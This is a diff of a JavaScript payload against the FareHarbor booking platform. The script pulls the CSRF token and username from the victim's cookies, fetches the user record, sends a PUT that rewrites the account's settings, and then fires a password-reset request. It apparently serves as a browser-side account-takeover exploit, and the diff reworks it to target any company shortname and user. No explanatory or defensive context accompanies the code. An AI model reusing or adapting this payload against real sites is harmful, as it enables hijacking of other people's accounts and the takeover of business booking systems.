@@ -1,14 +1,16 @@
+const shortname = 'chinaholidaysaud';
+const csrf = document.cookie.match(/csrftoken=([^;]*)/)[1];
+const username = document.cookie.match(/fh-username=([^;]*)/)[1];
 var xhrg = new XMLHttpRequest();
-xhrg.open('GET', 'https://fareharbor.com/api/v1/companies/chinaholidaysaud/users/chinaholidays/', true);
+xhrg.open('GET', 'https://fareharbor.com/api/v1/companies/'+shortname+'/users/'+username+'/', true);
 xhrg.onload = function() {
   if (xhrg.status === 200) {
     var user = JSON.parse(xhrg.responseText).user;
-    const csrf = document.cookie.match(/csrftoken=([^;]*)/)[1];
     var xhr = new XMLHttpRequest();
-    xhr.open('PUT', 'https://fareharbor.com/api/v1/companies/chinaholidaysaud/users/'+ user.username +'/', true);
+    xhr.open('PUT', 'https://fareharbor.com/api/v1/companies/'+shortname+'/users/'+ user.username +'/', true);
     xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
     xhr.setRequestHeader('X-Csrftoken', csrf);
-    xhr.setRequestHeader('Referer', 'https://fareharbor.com/chinaholidaysaud/dashboard/settings/permissions/users/'+ user.username +'/settings/');
+    xhr.setRequestHeader('Referer', 'https://fareharbor.com/'+shortname+'/dashboard/settings/permissions/users/'+username+'/settings/');
     
     // Set the request payload
     xhr.send(JSON.stringify({
@@ -19,12 +21,24 @@ xhrg.onload = function() {
       "group": user.group.pk,
       "partner_group": user.partner_group.pk
     }));
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                console.log('User updated successfully');
+            } else {
+                console.error('Error updating user:', xhr.statusText);
+            }
+        }
+    };
     var reset = new XMLHttpRequest();
     reset.open('POST', 'https://fareharbor.com/api/v1/forgot/password/', true);
     reset.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
     reset.setRequestHeader('X-Csrftoken', csrf);
     reset.setRequestHeader('Referer', 'https://fareharbor.com/forgot/password/');
-    reset.send(JSON.stringify({"shortname":user.shortname,"username":user.username}));
+    reset.send(JSON.stringify({
+        "shortname": shortname,
+        "username": user.username
+    }));
 
   } else {
     console.error('Error:', xhrg.statusText);
